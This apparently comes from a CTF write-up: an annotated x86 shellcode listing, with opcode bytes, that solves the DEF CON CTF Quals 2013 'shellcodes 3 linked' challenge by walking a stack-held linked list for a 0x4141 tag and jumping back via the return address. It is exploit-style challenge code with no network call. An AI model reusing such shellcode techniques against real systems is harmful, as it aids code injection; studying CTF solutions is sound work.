; http://leetmore.ctf.su/wp/defcon-ctf-quals-2013-shellcodes-3-linked/

; first of all, fuck the prologue
59                pop ecx  ; save return address in ecx
            _loopAgain:
5E                pop esi  ; get argument (pointer to list) in esi
AD                lodsd    ; == mov eax, [esi]
66:8178 05 4141   cmp word ptr [eax+5], 4141h   ; we have to sacrifice two bytes of the tag for 1 byte less code
50                push eax ; put eax back into stack for 'pop esi'
75 F5             jne _loopAgain
 
04 08             add al, 8  ; eax = &eax->data
FFE1              jmp ecx    ; jump back to return address. We don't care about stack frames.


